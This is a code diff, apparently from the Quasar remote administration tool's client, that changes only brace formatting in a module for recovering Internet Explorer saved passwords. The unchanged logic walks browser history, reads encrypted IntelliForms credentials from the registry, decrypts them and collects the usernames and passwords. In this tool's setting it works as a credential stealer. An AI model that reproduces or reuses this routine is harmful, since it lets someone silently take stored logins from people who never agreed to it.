@@ -11,66 +11,50 @@ using Microsoft.Win32;
 using Quasar.Client.Helper;
 using Quasar.Common.Models;
 
-namespace Quasar.Client.Recovery.Browsers
-{
-    public static class InternetExplorer
-    {
+namespace Quasar.Client.Recovery.Browsers {
+    public static class InternetExplorer {
         #region Public Members
-        public static List<RecoveredAccount> GetSavedPasswords()
-        {
+        public static List<RecoveredAccount> GetSavedPasswords() {
             List<RecoveredAccount> data = new List<RecoveredAccount>();
 
-            try
-            {
-                using (ExplorerUrlHistory ieHistory = new ExplorerUrlHistory())
-                {
+            try {
+                using (ExplorerUrlHistory ieHistory = new ExplorerUrlHistory()) {
                     List<string[]> dataList = new List<string[]>();
 
-                    foreach (STATURL item in ieHistory)
-                    {
-                        try
-                        {
-                            if (DecryptIePassword(item.UrlString, dataList))
-                            {
-                                foreach (string[] loginInfo in dataList)
-                                {
+                    foreach (STATURL item in ieHistory) {
+                        try {
+                            if (DecryptIePassword(item.UrlString, dataList)) {
+                                foreach (string[] loginInfo in dataList) {
                                     data.Add(new RecoveredAccount() { Username = loginInfo[0], Password = loginInfo[1], Url = item.UrlString, Application = "InternetExplorer" });
                                 }
                             }
-                        }
-                        catch (Exception)
-                        {
+                        } catch (Exception) {
                             // TODO: Add packet sending for error
                         }
                     }
                 }
-            }
-            catch (Exception)
-            {
+            } catch (Exception) {
                 // TODO: Add packet sending for error
             }
 
             return data;
         }
-        
-        public static List<RecoveredAccount> GetSavedCookies()
-        {
+
+        public static List<RecoveredAccount> GetSavedCookies() {
             return new List<RecoveredAccount>();
         }
         #endregion
         #region Private Methods
         private const string regPath = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
 
-        static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
-        {
+        static T ByteArrayToStructure<T>(byte[] bytes) where T : struct {
             GCHandle handle = GCHandle.Alloc(bytes, GCHandleType.Pinned);
             T stuff = (T)Marshal.PtrToStructure(handle.AddrOfPinnedObject(), typeof(T));
             handle.Free();
             return stuff;
 
         }
-        static bool DecryptIePassword(string url, List<string[]> dataList)
-        {
+        static bool DecryptIePassword(string url, List<string[]> dataList) {
             byte[] cypherBytes;
 
             //Get the hash for the passed URL
@@ -81,8 +65,7 @@ namespace Quasar.Client.Recovery.Browsers
                 return false;
 
             //Now retrieve the encrypted credentials for this registry hash entry....
-            using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
-            {
+            using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath)) {
                 if (key == null) return false;
 
                 //Retrieve encrypted data for this website hash...
@@ -100,8 +83,7 @@ namespace Quasar.Client.Recovery.Browsers
             var ieAutoHeader = ByteArrayToStructure<IEAutoComplteSecretHeader>(decryptedBytes);
 
             //check if the data contains enough length....
-            if (decryptedBytes.Length >= (ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize + ieAutoHeader.dwSecretSize))
-            {
+            if (decryptedBytes.Length >= (ieAutoHeader.dwSize + ieAutoHeader.dwSecretInfoSize + ieAutoHeader.dwSecretSize)) {
 
                 //Get the total number of secret entries (username & password) for the site...
                 // user name and passwords are accounted as separate secrets, but will be threated in pairs here.
@@ -119,8 +101,7 @@ namespace Quasar.Client.Recovery.Browsers
 
                 offset = Marshal.SizeOf(ieAutoHeader);
                 // Each time process 2 secret entries for username & password
-                for (int i = 0; i < dwTotalSecrets; i++)
-                {
+                for (int i = 0; i < dwTotalSecrets; i++) {
 
                     byte[] secEntryBuffer = new byte[sizeOfSecretEntry];
                     Buffer.BlockCopy(decryptedBytes, offset, secEntryBuffer, 0, secEntryBuffer.Length);
@@ -155,13 +136,11 @@ namespace Quasar.Client.Recovery.Browsers
             return true;
         }
 
-        static bool DoesURLMatchWithHash(string urlHash)
-        {
+        static bool DoesURLMatchWithHash(string urlHash) {
             // enumerate values of the target registry
             bool result = false;
 
-            using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
-            {
+            using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath)) {
                 if (key == null) return false;
 
                 if (key.GetValueNames().Any(value => value == urlHash))
@@ -170,8 +149,7 @@ namespace Quasar.Client.Recovery.Browsers
             return result;
         }
 
-        static string GetURLHashString(string wstrURL)
-        {
+        static string GetURLHashString(string wstrURL) {
             IntPtr hProv = IntPtr.Zero;
             IntPtr hHash = IntPtr.Zero;
 
@@ -183,8 +161,7 @@ namespace Quasar.Client.Recovery.Browsers
             byte[] bytesToCrypt = Encoding.Unicode.GetBytes(wstrURL);
 
             StringBuilder urlHash = new StringBuilder(42);
-            if (CryptHashData(hHash, bytesToCrypt, (wstrURL.Length + 1) * 2, 0))
-            {
+            if (CryptHashData(hHash, bytesToCrypt, (wstrURL.Length + 1) * 2, 0)) {
 
                 // retrieve 20 bytes of hash value
                 uint dwHashLen = 20;
@@ -197,8 +174,7 @@ namespace Quasar.Client.Recovery.Browsers
                 //Convert the 20 byte hash value to hexadecimal string format...
                 byte tail = 0; // used to calculate value for the last 2 bytes
                 urlHash.Length = 0;
-                for (int i = 0; i < dwHashLen; ++i)
-                {
+                for (int i = 0; i < dwHashLen; ++i) {
 
                     byte c = buffer[i];
                     tail += c;
@@ -220,8 +196,7 @@ namespace Quasar.Client.Recovery.Browsers
         //
         //One Secret Info header specifying number of secret strings
         [StructLayout(LayoutKind.Sequential)]
-        struct IESecretInfoHeader
-        {
+        struct IESecretInfoHeader {
 
             public uint dwIdHeader;     // value - 57 49 43 4B
             public uint dwSize;         // size of this header....24 bytes
@@ -234,8 +209,7 @@ namespace Quasar.Client.Recovery.Browsers
 
         //Main Decrypted Autocomplete Header data
         [StructLayout(LayoutKind.Sequential)]
-        struct IEAutoComplteSecretHeader
-        {
+        struct IEAutoComplteSecretHeader {
 
             public uint dwSize;                        //This header size
             public uint dwSecretInfoSize;              //= sizeof(IESecretInfoHeader) + numSecrets * sizeof(SecretEntry);
@@ -249,8 +223,7 @@ namespace Quasar.Client.Recovery.Browsers
         // Header describing each of the secrets such ass username/password.
         // Two secret entries having same SecretId are paired
         [StructLayout(LayoutKind.Explicit)]
-        struct SecretEntry
-        {
+        struct SecretEntry {
 
             [FieldOffset(0)]
             public uint dwOffset;           //Offset of this secret entry from the start of secret entry strings
@@ -282,8 +255,7 @@ namespace Quasar.Client.Recovery.Browsers
 
         private const int ALG_CLASS_HASH = 4 << 13;
         private const int ALG_SID_SHA1 = 4;
-        private enum ALG_ID
-        {
+        private enum ALG_ID {
 
             CALG_MD5 = 0x00008003,
             CALG_SHA1 = ALG_CLASS_HASH | ALG_SID_SHA1
@@ -305,8 +277,7 @@ namespace Quasar.Client.Recovery.Browsers
         [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool CryptDestroyHash(IntPtr hHash);
 
-        private enum HashParameters
-        {
+        private enum HashParameters {
 
             HP_ALGID = 0x0001,   // Hash algorithm
             HP_HASHVAL = 0x0002, // Hash value
@@ -325,8 +296,7 @@ namespace Quasar.Client.Recovery.Browsers
         #endregion
     }
 
-    public class ExplorerUrlHistory : IDisposable
-    {
+    public class ExplorerUrlHistory : IDisposable {
 
         private readonly IUrlHistoryStg2 obj;
         private UrlHistoryClass urlHistory;
@@ -334,8 +304,7 @@ namespace Quasar.Client.Recovery.Browsers
         /// <summary>
         /// Default constructor for UrlHistoryWrapperClass
         /// </summary>
-        public ExplorerUrlHistory()
-        {
+        public ExplorerUrlHistory() {
 
             urlHistory = new UrlHistoryClass();
             obj = (IUrlHistoryStg2)urlHistory;
@@ -345,10 +314,8 @@ namespace Quasar.Client.Recovery.Browsers
 
         }
 
-        public int Count
-        {
-            get
-            {
+        public int Count {
+            get {
                 return _urlHistoryList.Count;
             }
         }
@@ -357,8 +324,7 @@ namespace Quasar.Client.Recovery.Browsers
         /// <summary>
         /// Clean up any resources being used.
         /// </summary>
-        public void Dispose()
-        {
+        public void Dispose() {
 
             Marshal.ReleaseComObject(obj);
             urlHistory = null;
@@ -374,8 +340,7 @@ namespace Quasar.Client.Recovery.Browsers
         /// <param name="dwFlags">the flag which indicate where a URL is placed in the history.
         /// <example><c>ADDURL_FLAG.ADDURL_ADDTOHISTORYANDCACHE</c></example>
         /// </param>
-        public void AddHistoryEntry(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags)
-        {
+        public void AddHistoryEntry(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags) {
 
             obj.AddUrl(pocsUrl, pocsTitle, dwFlags);
 
@@ -386,18 +351,14 @@ namespace Quasar.Client.Recovery.Browsers
         /// </summary>
         /// <param name="pocsUrl">the string of the URL to delete.</param>
         /// <param name="dwFlags"><c>dwFlags = 0</c></param>
-        public bool DeleteHistoryEntry(string pocsUrl, int dwFlags)
-        {
+        public bool DeleteHistoryEntry(string pocsUrl, int dwFlags) {
 
-            try
-            {
+            try {
 
                 obj.DeleteUrl(pocsUrl, dwFlags);
                 return true;
 
-            }
-            catch (Exception)
-            {
+            } catch (Exception) {
 
                 return false;
 
@@ -414,22 +375,18 @@ namespace Quasar.Client.Recovery.Browsers
         /// <example><c>STATURL_QUERYFLAGS.STATURL_QUERYFLAG_TOPLEVEL</c></example></param>
         /// <returns>Returns STATURL structure that received additional URL history information. If the returned  STATURL's pwcsUrl is not null, Queried URL has been visited by the current user.
         /// </returns>
-        public STATURL QueryUrl(string pocsUrl, STATURL_QUERYFLAGS dwFlags)
-        {
+        public STATURL QueryUrl(string pocsUrl, STATURL_QUERYFLAGS dwFlags) {
 
             var lpSTATURL = new STATURL();
 
-            try
-            {
+            try {
 
                 //In this case, queried URL has been visited by the current user.
                 obj.QueryUrl(pocsUrl, dwFlags, ref lpSTATURL);
                 //lpSTATURL.pwcsUrl is NOT null;
                 return lpSTATURL;
 
-            }
-            catch (FileNotFoundException)
-            {
+            } catch (FileNotFoundException) {
 
                 //Queried URL has not been visited by the current user.
                 //lpSTATURL.pwcsUrl is set to null;
@@ -442,8 +399,7 @@ namespace Quasar.Client.Recovery.Browsers
         /// <summary>
         /// Delete all the history except today's history, and Temporary Internet Files.
         /// </summary>
-        public void ClearHistory()
-        {
+        public void ClearHistory() {
 
             obj.ClearHistory();
 
@@ -454,26 +410,22 @@ namespace Quasar.Client.Recovery.Browsers
         /// </summary>
         /// <returns>Returns [{STATURLEnumerator}: M.S. : GetEnumerator() returns IEnumerator instead.] object that can iterate through the history cache.</returns>
 
-        public STATURLEnumerator GetEnumerator()
-        {
+        public STATURLEnumerator GetEnumerator() {
 
             return new STATURLEnumerator((IEnumSTATURL)obj.EnumUrls);
 
         }
 
-        public STATURL this[int index]
-        {
+        public STATURL this[int index] {
 
-            get
-            {
+            get {
 
                 if (index < _urlHistoryList.Count && index >= 0)
                     return _urlHistoryList[index];
                 throw new IndexOutOfRangeException();
 
             }
-            set
-            {
+            set {
 
                 if (index < _urlHistoryList.Count && index >= 0)
                     _urlHistoryList[index] = value;
@@ -489,8 +441,7 @@ namespace Quasar.Client.Recovery.Browsers
         /// The inner class that can iterate through the history cache. STATURLEnumerator does not implement IEnumerator interface.
         /// The items in the history cache changes often, and enumerator needs to reflect the data as it existed at a specific point in time.
         /// </summary>
-        public class STATURLEnumerator
-        {
+        public class STATURLEnumerator {
 
             private readonly IEnumSTATURL _enumerator;
             private int _index;
@@ -500,8 +451,7 @@ namespace Quasar.Client.Recovery.Browsers
             /// Constructor for <c>STATURLEnumerator</c> that accepts IEnumSTATURL object that represents the <c>IEnumSTATURL</c> COM Interface.
             /// </summary>
             /// <param name="enumerator">the <c>IEnumSTATURL</c> COM Interface</param>
-            public STATURLEnumerator(IEnumSTATURL enumerator)
-            {
+            public STATURLEnumerator(IEnumSTATURL enumerator) {
 
                 _enumerator = enumerator;
 
@@ -512,11 +462,9 @@ namespace Quasar.Client.Recovery.Browsers
             /// <summary>
             /// Gets the current item in the url history cache.
             /// </summary>
-            public STATURL Current
-            {
+            public STATURL Current {
 
-                get
-                {
+                get {
                     return _staturl;
                 }
 
@@ -528,8 +476,7 @@ namespace Quasar.Client.Recovery.Browsers
             /// <returns>true if the enumerator was successfully advanced to the next element;
             ///  false if the enumerator has passed the end of the url history cache.
             ///  </returns>
-            public bool MoveNext()
-            {
+            public bool MoveNext() {
 
                 _staturl = new STATURL();
                 _enumerator.Next(1, ref _staturl, out _index);
@@ -543,8 +490,7 @@ namespace Quasar.Client.Recovery.Browsers
             /// Skips a specified number of Call objects in the enumeration sequence. does not work!
             /// </summary>
             /// <param name="celt"></param>
-            public void Skip(int celt)
-            {
+            public void Skip(int celt) {
 
                 _enumerator.Skip(celt);
 
@@ -553,8 +499,7 @@ namespace Quasar.Client.Recovery.Browsers
             /// <summary>
             /// Resets the enumerator interface so that it begins enumerating at the beginning of the history.
             /// </summary>
-            public void Reset()
-            {
+            public void Reset() {
 
                 _enumerator.Reset();
 
@@ -564,8 +509,7 @@ namespace Quasar.Client.Recovery.Browsers
             /// Creates a duplicate enumerator containing the same enumeration state as the current one. does not work!
             /// </summary>
             /// <returns>duplicate STATURLEnumerator object</returns>
-            public STATURLEnumerator Clone()
-            {
+            public STATURLEnumerator Clone() {
 
                 IEnumSTATURL ppenum;
                 _enumerator.Clone(out ppenum);
@@ -581,8 +525,7 @@ namespace Quasar.Client.Recovery.Browsers
             /// <example>SetFilter('http://', STATURL_QUERYFLAGS.STATURL_QUERYFLAG_TOPLEVEL)  retrieves only entries starting with 'http.//'. </example>
             /// </param>
             /// <param name="dwFlags">STATURL_QUERYFLAGS Enumeration<exapmle><c>STATURL_QUERYFLAGS.STATURL_QUERYFLAG_TOPLEVEL</c></exapmle></param>
-            public void SetFilter(string poszFilter, STATURLFLAGS dwFlags)
-            {
+            public void SetFilter(string poszFilter, STATURLFLAGS dwFlags) {
 
                 _enumerator.SetFilter(poszFilter, dwFlags);
 
@@ -594,11 +537,9 @@ namespace Quasar.Client.Recovery.Browsers
             /// <param name="list">IList object
             /// <example><c>ArrayList</c>object</example>
             /// </param>
-            public void GetUrlHistory(IList list)
-            {
+            public void GetUrlHistory(IList list) {
 
-                while (true)
-                {
+                while (true) {
 
                     _staturl = new STATURL();
                     _enumerator.Next(1, ref _staturl, out _index);
@@ -618,8 +559,7 @@ namespace Quasar.Client.Recovery.Browsers
 
     }
 
-    public class Win32api
-    {
+    public class Win32api {
 
         #region shlwapi_URL enum
 
@@ -627,8 +567,7 @@ namespace Quasar.Client.Recovery.Browsers
         /// Used by CannonializeURL method.
         /// </summary>
         [Flags]
-        public enum shlwapi_URL : uint
-        {
+        public enum shlwapi_URL : uint {
 
             /// <summary>
             /// Treat "/./" and "/../" in a URL string as literal characters, not as shorthand for navigation.
@@ -697,16 +636,14 @@ namespace Quasar.Client.Recovery.Browsers
         /// <param name="pszUrl">URL string</param>
         /// <param name="dwFlags">shlwapi_URL Enumeration. Flags that specify how the URL is converted to canonical form.</param>
         /// <returns>The converted URL</returns>
-        public static string CannonializeURL(string pszUrl, shlwapi_URL dwFlags)
-        {
+        public static string CannonializeURL(string pszUrl, shlwapi_URL dwFlags) {
 
             var buff = new StringBuilder(260);
             int s = buff.Capacity;
             int c = UrlCanonicalize(pszUrl, buff, ref s, dwFlags);
             if (c == 0)
                 return buff.ToString();
-            else
-            {
+            else {
 
                 buff.Capacity = s;
                 c = UrlCanonicalize(pszUrl, buff, ref s, dwFlags);
@@ -726,19 +663,15 @@ namespace Quasar.Client.Recovery.Browsers
         /// </summary>
         /// <param name="filetime">FILETIME structure</param>
         /// <returns>DateTime structure</returns>
-        public static DateTime FileTimeToDateTime(System.Runtime.InteropServices.ComTypes.FILETIME filetime)
-        {
+        public static DateTime FileTimeToDateTime(System.Runtime.InteropServices.ComTypes.FILETIME filetime) {
 
             var st = new SYSTEMTIME();
             FileTimeToSystemTime(ref filetime, ref st);
-            try
-            {
+            try {
 
                 return new DateTime(st.Year, st.Month, st.Day, st.Hour, st.Minute, st.Second, st.Milliseconds);
 
-            }
-            catch (Exception)
-            {
+            } catch (Exception) {
 
                 return DateTime.Now;
 
@@ -756,8 +689,7 @@ namespace Quasar.Client.Recovery.Browsers
         /// </summary>
         /// <param name="datetime">DateTime structure</param>
         /// <returns>FILETIME structure</returns>
-        public static System.Runtime.InteropServices.ComTypes.FILETIME DateTimeToFileTime(DateTime datetime)
-        {
+        public static System.Runtime.InteropServices.ComTypes.FILETIME DateTimeToFileTime(DateTime datetime) {
 
             var st = new SYSTEMTIME();
             st.Year = (short)datetime.Year;
@@ -785,8 +717,7 @@ namespace Quasar.Client.Recovery.Browsers
           uint cbSizeFileInfo, uint uFlags);
 
         #region Nested type: SYSTEMTIME
-        public struct SYSTEMTIME
-        {
+        public struct SYSTEMTIME {
 
             public Int16 Day;
             public Int16 DayOfWeek;
@@ -807,8 +738,7 @@ namespace Quasar.Client.Recovery.Browsers
     /// Contains information about a file object.
     /// </summary>
     [StructLayout(LayoutKind.Sequential)]
-    public struct SHFILEINFO
-    {
+    public struct SHFILEINFO {
 
         public IntPtr hIcon;
         public IntPtr iIcon;
@@ -824,13 +754,11 @@ namespace Quasar.Client.Recovery.Browsers
     /// <summary>
     /// The helper class to sort in ascending order by FileTime(LastVisited).
     /// </summary>
-    public class SortFileTimeAscendingHelper : IComparer
-    {
+    public class SortFileTimeAscendingHelper : IComparer {
 
         #region IComparer Members
 
-        int IComparer.Compare(object a, object b)
-        {
+        int IComparer.Compare(object a, object b) {
 
             var c1 = (STATURL)a;
             var c2 = (STATURL)b;
@@ -844,8 +772,7 @@ namespace Quasar.Client.Recovery.Browsers
         [DllImport("Kernel32.dll")]
         private static extern int CompareFileTime([In] ref System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime1, [In] ref System.Runtime.InteropServices.ComTypes.FILETIME lpFileTime2);
 
-        public static IComparer SortFileTimeAscending()
-        {
+        public static IComparer SortFileTimeAscending() {
 
             return new SortFileTimeAscendingHelper();
 
@@ -853,8 +780,7 @@ namespace Quasar.Client.Recovery.Browsers
 
     }
 
-    public enum STATURL_QUERYFLAGS : uint
-    {
+    public enum STATURL_QUERYFLAGS : uint {
 
         /// <summary>
         /// The specified URL is in the content cache.
@@ -881,8 +807,7 @@ namespace Quasar.Client.Recovery.Browsers
     /// <summary>
     /// Flag on the dwFlags parameter of the STATURL structure, used by the SetFilter method.
     /// </summary>
-    public enum STATURLFLAGS : uint
-    {
+    public enum STATURLFLAGS : uint {
 
         /// <summary>
         /// Flag on the dwFlags parameter of the STATURL structure indicating that the item is in the cache.
@@ -899,8 +824,7 @@ namespace Quasar.Client.Recovery.Browsers
     /// <summary>
     /// Used bu the AddHistoryEntry method.
     /// </summary>
-    public enum ADDURL_FLAG : uint
-    {
+    public enum ADDURL_FLAG : uint {
 
         /// <summary>
         /// Write to both the visited links and the dated containers.
@@ -919,8 +843,7 @@ namespace Quasar.Client.Recovery.Browsers
     /// The structure that contains statistics about a URL.
     /// </summary>
     [StructLayout(LayoutKind.Sequential)]
-    public struct STATURL
-    {
+    public struct STATURL {
 
         /// <summary>
         /// Struct size
@@ -962,21 +885,17 @@ namespace Quasar.Client.Recovery.Browsers
         /// <summary>
         /// sets a column header in the DataGrid control. This property is not needed if you do not use it.
         /// </summary>
-        public string URL
-        {
+        public string URL {
 
-            get
-            {
+            get {
                 return pwcsUrl;
             }
 
         }
 
-        public string UrlString
-        {
+        public string UrlString {
 
-            get
-            {
+            get {
 
                 int index = pwcsUrl.IndexOf('?');
                 return index < 0 ? pwcsUrl : pwcsUrl.Substring(0, index);
@@ -988,11 +907,9 @@ namespace Quasar.Client.Recovery.Browsers
         /// <summary>
         /// sets a column header in the DataGrid control. This property is not needed if you do not use it.
         /// </summary>
-        public string Title
-        {
+        public string Title {
 
-            get
-            {
+            get {
 
                 if (pwcsUrl.StartsWith("file:"))
                     return Win32api.CannonializeURL(pwcsUrl, Win32api.shlwapi_URL.URL_UNESCAPE).Substring(8).Replace(
@@ -1006,11 +923,9 @@ namespace Quasar.Client.Recovery.Browsers
         /// <summary>
         /// sets a column header in the DataGrid control. This property is not needed if you do not use it.
         /// </summary>
-        public DateTime LastVisited
-        {
+        public DateTime LastVisited {
 
-            get
-            {
+            get {
 
                 return Win32api.FileTimeToDateTime(ftLastVisited).ToLocalTime();
 
@@ -1021,11 +936,9 @@ namespace Quasar.Client.Recovery.Browsers
         /// <summary>
         /// sets a column header in the DataGrid control. This property is not needed if you do not use it.
         /// </summary>
-        public DateTime LastUpdated
-        {
+        public DateTime LastUpdated {
 
-            get
-            {
+            get {
                 return Win32api.FileTimeToDateTime(ftLastUpdated).ToLocalTime();
             }
 
@@ -1034,20 +947,15 @@ namespace Quasar.Client.Recovery.Browsers
         /// <summary>
         /// sets a column header in the DataGrid control. This property is not needed if you do not use it.
         /// </summary>
-        public DateTime Expires
-        {
+        public DateTime Expires {
 
-            get
-            {
+            get {
 
-                try
-                {
+                try {
 
                     return Win32api.FileTimeToDateTime(ftExpires).ToLocalTime();
 
-                }
-                catch (Exception)
-                {
+                } catch (Exception) {
 
                     return DateTime.Now;
 
@@ -1057,8 +965,7 @@ namespace Quasar.Client.Recovery.Browsers
 
         }
 
-        public override string ToString()
-        {
+        public override string ToString() {
 
             return pwcsUrl;
 
@@ -1067,8 +974,7 @@ namespace Quasar.Client.Recovery.Browsers
     }
 
     [StructLayout(LayoutKind.Sequential)]
-    public struct UUID
-    {
+    public struct UUID {
 
         public int Data1;
         public short Data2;
@@ -1081,8 +987,7 @@ namespace Quasar.Client.Recovery.Browsers
     [ComImport]
     [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
     [Guid("3C374A42-BAE4-11CF-BF7D-00AA006946EE")]
-    public interface IEnumSTATURL
-    {
+    public interface IEnumSTATURL {
 
         void Next(int celt, ref STATURL rgelt, out int pceltFetched); //Returns the next \"celt\" URLS from the cache
         void Skip(int celt); //Skips the next \"celt\" URLS from the cache. does not work.
@@ -1097,8 +1002,7 @@ namespace Quasar.Client.Recovery.Browsers
     [ComImport]
     [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
     [Guid("3C374A41-BAE4-11CF-BF7D-00AA006946EE")]
-    public interface IUrlHistoryStg
-    {
+    public interface IUrlHistoryStg {
 
         void AddUrl(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags); //Adds a new history entry
         void DeleteUrl(string pocsUrl, int dwFlags); //Deletes an entry by its URL. does not work!
@@ -1107,8 +1011,7 @@ namespace Quasar.Client.Recovery.Browsers
 
         //Returns a STATURL for a given URL
         void BindToObject([In] string pocsUrl, [In] UUID riid, IntPtr ppvOut); //Binds to an object. does not work!
-        object EnumUrls
-        {
+        object EnumUrls {
 
             [return: MarshalAs(UnmanagedType.IUnknown)]
             get;
@@ -1122,8 +1025,7 @@ namespace Quasar.Client.Recovery.Browsers
     [ComImport]
     [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
     [Guid("AFA0DC11-C313-11D0-831A-00C04FD5AE38")]
-    public interface IUrlHistoryStg2 : IUrlHistoryStg
-    {
+    public interface IUrlHistoryStg2 : IUrlHistoryStg {
 
         new void AddUrl(string pocsUrl, string pocsTitle, ADDURL_FLAG dwFlags); //Adds a new history entry
         new void DeleteUrl(string pocsUrl, int dwFlags); //Deletes an entry by its URL. does not work!
@@ -1131,8 +1033,7 @@ namespace Quasar.Client.Recovery.Browsers
 
         //Returns a STATURL for a given URL
         new void BindToObject([In] string pocsUrl, [In] UUID riid, IntPtr ppvOut); //Binds to an object. does not work!
-        new object EnumUrls
-        {
+        new object EnumUrls {
 
             [return: MarshalAs(UnmanagedType.IUnknown)]
             get;
@@ -1150,10 +1051,9 @@ namespace Quasar.Client.Recovery.Browsers
     //UrlHistory class
     [ComImport]
     [Guid("3C374A40-BAE4-11CF-BF7D-00AA006946EE")]
-    public class UrlHistoryClass
-    {
+    public class UrlHistoryClass {
 
 
     }
-#endregion
+    #endregion
 }
